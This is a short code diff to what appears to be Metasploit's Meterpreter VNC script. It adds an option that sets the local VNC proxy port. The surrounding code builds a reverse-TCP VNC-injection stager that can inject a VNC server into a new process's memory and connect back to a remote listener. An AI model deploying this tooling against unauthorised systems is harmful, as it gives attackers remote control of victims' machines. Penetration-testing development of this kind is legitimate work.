@@ -13,6 +13,7 @@ opts = Rex::Parser::Arguments.new(
 	"-h"  => [ false,  "This help menu"],
 	"-r"  => [ true,   "The IP of a remote Metasploit listening for the connect back"],
 	"-p"  => [ true,   "The port on the remote host where Metasploit is listening (default: 4545)"],
+	"-v"  => [ true,   "The local port for the VNC proxy service (default: 5900)"],
 	"-i"  => [ false,  "Inject the vnc server into a new process's memory instead of building an exe"],
 	"-P"  => [ true,   "Executable to inject into (starts a new process).  Only useful with -i (default: notepad.exe)"],
 	"-D"  => [ false,  "Disable the automatic multi/handler (use with -r to accept on another system)"],
@@ -28,6 +29,7 @@ opts = Rex::Parser::Arguments.new(
 
 rhost    = Rex::Socket.source_address("1.2.3.4")
 rport    = 4545
+vport    = 5900
 lhost    = "127.0.0.1"
 
 
@@ -52,6 +54,8 @@ opts.parse(args) do |opt, idx, val|
 		rhost = val
 	when "-p"
 		rport = val.to_i
+	when "-v"
+		vport = val.to_i
 	when "-P"
 		runme = val
 	when "-D"
@@ -81,6 +85,7 @@ if (tunnel)
 	pay = client.framework.payloads.create(payload)
 	pay.datastore['RHOST'] = lhost
 	pay.datastore['LPORT'] = rport
+	pay.datastore['VNCPORT'] = vport
 else
 	print_status("Creating a VNC reverse tcp stager: LHOST=#{rhost} LPORT=#{rport})")
 	payload = "windows/vncinject/reverse_tcp"
@@ -88,6 +93,7 @@ else
 	pay = client.framework.payloads.create(payload)
 	pay.datastore['LHOST'] = rhost
 	pay.datastore['LPORT'] = rport
+	pay.datastore['VNCPORT'] = vport
 end
 
 if (not courtesy)
